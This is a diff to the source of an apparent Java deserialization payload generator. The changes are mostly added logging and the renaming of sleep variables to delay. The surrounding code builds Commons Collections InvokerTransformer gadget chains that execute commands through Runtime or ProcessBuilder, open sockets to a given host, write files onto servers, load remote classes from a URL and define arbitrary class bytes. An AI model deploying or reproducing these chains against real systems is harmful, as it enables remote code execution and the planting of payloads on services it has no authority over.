@@ -33,6 +33,7 @@ public class InvokerTransformer3 {
     @EnchantType({EnchantType.RUNTIME, EnchantType.DEFAULT})
     public Transformer[] runtime(SinksHelper sinksHelper) {
         String command = sinksHelper.getCommand();
+        Printer.greenInfo("command: " + command);
 
         return new Transformer[]{
                 new ConstantTransformer(Runtime.class),
@@ -57,9 +58,11 @@ public class InvokerTransformer3 {
     public Transformer[] processBuilder(SinksHelper sinksHelper) {
         String command = sinksHelper.getCommand();
         String os = sinksHelper.getOs();
+        Printer.greenInfo("command: " + command);
 
         Transformer[] transformers = new Transformer[0];
         if (os != null && os.toLowerCase().contains(EnchantType.WIN)) {
+            Printer.greenInfo("os: " + os);
             transformers = new Transformer[]{
                     new ConstantTransformer(ProcessBuilder.class),
                     new InvokerTransformer("getDeclaredConstructor", new Class[]{
@@ -132,21 +135,23 @@ public class InvokerTransformer3 {
      */
     @EnchantType({EnchantType.Delay})
     public Transformer[] delay(SinksHelper sinksHelper) {
-        String sleep = sinksHelper.getSleep();
-        Long sleepTime = sinksHelper.getSleepTime();
+        String delay = sinksHelper.getDelay();
+        Long delayTime = sinksHelper.getDelayTime();
+
+        Printer.greenInfo(String.format("System will delay response for %s seconds", delayTime));
 
         Transformer[] transformers = null;
-        if (sleep != null && sleep.equalsIgnoreCase("timeunit")) {
+        if (delay != null && delay.equalsIgnoreCase("timeunit")) {
             transformers = new Transformer[]{
                     new ConstantTransformer(TimeUnit.class),
                     new InvokerTransformer("getDeclaredField", new Class[]{
                             String.class}, new Object[]{
                             "SECONDS"}),
                     new InvokerTransformer("get", new Class[]{Object.class}, new Object[]{null}),
-                    new InvokerTransformer("sleep", new Class[]{long.class}, new Object[]{sleepTime}),
+                    new InvokerTransformer("sleep", new Class[]{long.class}, new Object[]{delayTime}),
                     new ConstantTransformer(1)};
         } else {
-            sleepTime = sleepTime * 1000L;
+            delayTime = delayTime * 1000L;
             transformers = new Transformer[]{
                     new ConstantTransformer(Thread.class),
                     new InvokerTransformer("getMethod", new Class[]{
@@ -155,7 +160,7 @@ public class InvokerTransformer3 {
                     new InvokerTransformer("invoke", new Class[]{
                             Object.class, Object[].class}, new Object[]{
                             null, null}),
-                    new InvokerTransformer("sleep", new Class[]{long.class}, new Object[]{sleepTime}),
+                    new InvokerTransformer("sleep", new Class[]{long.class}, new Object[]{delayTime}),
                     new ConstantTransformer(1)};
         }
 
@@ -171,6 +176,8 @@ public class InvokerTransformer3 {
     @EnchantType({EnchantType.Socket})
     public Transformer[] socket(SinksHelper sinksHelper) {
         String thost = sinksHelper.getHost();
+
+        Printer.greenInfo("System will initiate a socket request to " + thost);
 
         String[] hostSplit = thost.split("[:]");
         String host = hostSplit[0];
@@ -196,10 +203,12 @@ public class InvokerTransformer3 {
         String serverFilePath = sinksHelper.getServerFilePath();
         String localFilePath = sinksHelper.getLocalFilePath();
         String fileContent = sinksHelper.getFileContent();
+        Printer.greenInfo("Server file path: " + serverFilePath);
 
         byte[] contentBytes = new byte[]{};
 
         if (localFilePath != null) {
+            Printer.greenInfo("Local file path: " + localFilePath);
             try {
                 FileInputStream fileInputStream = new FileInputStream(localFilePath);
                 contentBytes = new byte[fileInputStream.available()];
@@ -235,10 +244,14 @@ public class InvokerTransformer3 {
         String remoteClassName = sinksHelper.getRemoteClassName();
         Object constructor = sinksHelper.getConstructor();
 
+        Printer.greenInfo("Remote url: " + url);
+        Printer.greenInfo("Remote class name: " + remoteClassName);
+
         Transformer[] transformers;
 
         // 构造方法
         if (constructor != null) {
+            Printer.greenInfo("Remote class constructor param: " + constructor);
             // 转为 Integer
             try {
                 constructor = Integer.parseInt(constructor.toString());
@@ -297,7 +310,6 @@ public class InvokerTransformer3 {
             javaClassName = javaClassHelper.getJavaClassName();
         }
 
-
         if (classBytes == null) {
             Printer.error("Miss classBytes");
         }
@@ -305,9 +317,9 @@ public class InvokerTransformer3 {
             Printer.error("Miss javaClassName");
         }
 
-
         Transformer[] transformers;
         if (loadFunction != null && loadFunction.equalsIgnoreCase(EnchantType.RHINO)) {
+            Printer.greenInfo("Class load function is " + "org.mozilla.javascript.DefiningClassLoader");
             /**
              * org.mozilla.javascript.DefiningClassLoader.defineClass()
              * 需要 org.mozilla:rhino 依赖
@@ -321,6 +333,7 @@ public class InvokerTransformer3 {
                     new InvokerTransformer("newInstance", new Class[]{}, new Object[]{}),
                     new ConstantTransformer(1)};
         } else {
+            Printer.greenInfo("Class load function is " + "javax.script.ScriptEngineManager");
             /**
              * javax.script.ScriptEngineManager
              */
@@ -345,7 +358,6 @@ public class InvokerTransformer3 {
                             String.class}, new Object[]{code}),
                     new ConstantTransformer(1)};
         }
-
 
         return transformers;
     }
